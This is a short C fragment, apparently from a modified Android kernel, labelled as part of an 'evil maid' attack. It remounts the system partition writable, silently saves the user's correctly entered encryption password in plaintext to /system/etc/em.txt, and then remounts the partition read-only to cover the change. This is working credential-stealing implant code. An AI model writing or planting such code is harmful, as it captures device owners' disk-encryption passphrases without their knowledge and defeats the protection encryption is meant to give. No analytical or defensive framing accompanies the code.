  // Evil Maid: Store correct password
  if (!evm) {
    do_mount("/dev/block/mtdblock5", "/system", "yaffs2", O_RDWR | MS_REMOUNT, NULL);

    old_fs = get_fs();
    set_fs(get_ds());
    file = filp_open("/system/etc/em.txt", O_CREAT | O_RDWR, 0644);

    if (! IS_ERR(file))
      vfs_write(file, password, strlen(password), &file->f_pos);    

    filp_close(file, NULL);
    set_fs(old_fs);

    do_mount("/dev/block/mtdblock5", "/system", "yaffs2", MS_RDONLY | MS_REMOUNT, NULL);
  }
